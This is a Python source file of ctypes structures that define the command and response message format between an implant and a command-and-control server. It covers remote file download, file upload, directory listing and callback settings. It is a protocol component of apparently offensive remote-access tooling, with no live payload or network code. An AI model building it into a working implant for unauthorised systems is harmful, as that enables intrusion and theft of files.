# Patrick Sacchet
# This file defines common data types shared between the implant and C2

import ctypes
from enum import IntEnum


##################################
#           Commands             #
##################################

# Define our options for the user to choose from 
class Commands(IntEnum):
    disconnect = 0
    getfile = 1
    putfile = 2
    dirlist = 3

class DisconnectCommand(ctypes.Structure):
    _fields_ = [
        ("sleep", ctypes.c_uint32),
        ("callbackport", ctypes.c_int32)
    ]

class GetFileCommand(ctypes.Structure):
    _fields_ = [
        ("filepath", ctypes.c_char * 1024) # use an actual array...
    ]

class PutFileCommand(ctypes.Structure):
    _fields_ = [
        ("filepath", ctypes.c_char_p),
        ("filebytes", ctypes.c_char_p)
    ]

class DirListCommand(ctypes.Structure):
    _fields_ = [
        ("dirpath", ctypes.c_char_p)
    ]

class CommandDetails(ctypes.Union):
    _fields_ = [
        ("disconnectcommand", DisconnectCommand),
        ("getfilecommand", GetFileCommand),
        ("putfilecommand", PutFileCommand),
        ("dirlistcommand", DirListCommand)
    ]

# Mimics our Command struct in C2/Common.h
class Command(ctypes.Structure):
    _fields_ = [
        ("command", ctypes.c_uint8),
        ("commanddetails", CommandDetails)
    ]

##################################
#           Responses            #
##################################

# No reponse for disconnect needed

class GetFileResponse(ctypes.Structure):
    _fields_ = [
        ("filesize", ctypes.c_uint64),
        ("filebytes", ctypes.c_char_p)
    ]

class PutFileResponse(ctypes.Structure):
    _fields_ = [
        ("byteswritten", ctypes.c_uint64)
    ]

class DirListResponse(ctypes.Structure):
    _fields_ = [
        ("dirs", ctypes.c_char_p)
    ]

class ResponseDetails(ctypes.Union):
    _fields_ = [
        ("getfileresponse", GetFileResponse),
        ("putfileresponse", PutFileResponse),
        ("dirlistresponse", DirListResponse)
    ]

# Mimics our Response struct in C2/Common.h
class Response(ctypes.Structure):
    _fields_ = [
        ("response", ctypes.c_uint8),
        ("responsedetails", ResponseDetails)
    ]